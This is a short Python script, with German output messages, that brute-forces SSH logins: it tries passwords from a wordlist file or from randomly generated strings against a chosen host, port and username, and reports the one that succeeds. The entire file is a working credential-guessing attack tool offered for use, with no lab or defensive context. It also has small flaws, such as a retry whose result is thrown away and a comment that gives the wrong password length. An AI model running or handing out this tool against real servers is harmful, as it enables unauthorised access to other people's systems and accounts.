import paramiko
import sys
import string
import random
import time
from datetime import datetime

def try_ssh_connect(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, username, password, timeout=5)
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException as e:
        print(f"SSH Fehler: {e}")
        time.sleep(5)
        try_ssh_connect(host, port, username, password)
        return False
    except Exception as e:
        print(f"Allgemeiner Fehler: {e}")
        return False
    finally:
        client.close()

def brute_force_ssh(host, port, username, password_list):
    for password in password_list:
        start_time = datetime.now().strftime('%H:%M:%S')
        print(f"[{start_time}] - [  :  :  ] -- Try passwort: {password}", end="\r")
        if try_ssh_connect(host, port, username, password):
            end_time = datetime.now().strftime('%H:%M:%S')
            print(f"[{start_time}] - [{end_time}] -- Try passwort: {password} -- Succes!")
            return password
        else:
            end_time = datetime.now().strftime('%H:%M:%S')
            print(f"[{start_time}] - [{end_time}] -- Try passwort: {password} -- false")
    print("Kein gültiges Passwort gefunden.")
    return None

def generate_random_passwords(length, count):
    characters = string.ascii_letters + string.digits# + string.punctuation
    return [''.join(random.choice(characters) for _ in range(length)) for _ in range(count)]

if __name__ == "__main__":
    if len(sys.argv) < 5 or (sys.argv[4] == "-r" and len(sys.argv) > 6):
        print("Verwendung: python3 IPssh.py <host> <port> <username> <password_list_datei | -r> <optional: anzahl>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    password_source = sys.argv[4]

    if password_source == "-r":
        count = int(sys.argv[5]) if len(sys.argv) == 6 else 100  # Default Anzahl von zufälligen Passwörtern
        passwords = generate_random_passwords(9, count)  # Default Passwortlänge: 8
    else:
        try:
            with open(password_source, 'r') as f:
                passwords = [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            print(f"Datei {password_source} nicht gefunden.")
            sys.exit(1)

    brute_force_ssh(host, port, username, passwords)

